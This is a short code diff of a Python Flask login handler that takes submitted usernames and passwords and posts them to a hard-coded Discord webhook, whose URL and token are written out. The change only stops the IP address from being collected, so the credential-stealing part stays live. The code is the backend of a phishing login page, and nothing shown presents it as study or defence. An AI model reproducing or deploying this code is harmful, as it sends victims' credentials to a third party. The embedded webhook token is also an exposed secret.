@@ -14,9 +14,9 @@ def index():
 def login():
     username = request.form.get('send_username')
     password = request.form.get('send_password')
-    ip_addr = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
+    #ip_addr = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
     try:
-        login_info = ("""Username ```{}``` password ```{}``` Ip_Address ```{}```""").format(username, password, ip_addr)
+        login_info = ("""Username ```{}``` password ```{}```""").format(username, password)
 
         hook = ("https://discord.com/api/webhooks/901158074906206218/x-bE5mVPAHZOXRxWYUKSqVz-pBZ0z7HY2tKBcOug2aqsjU_uzWNKuFqlvRhU8vhiV7yA")
         msg = str(login_info)
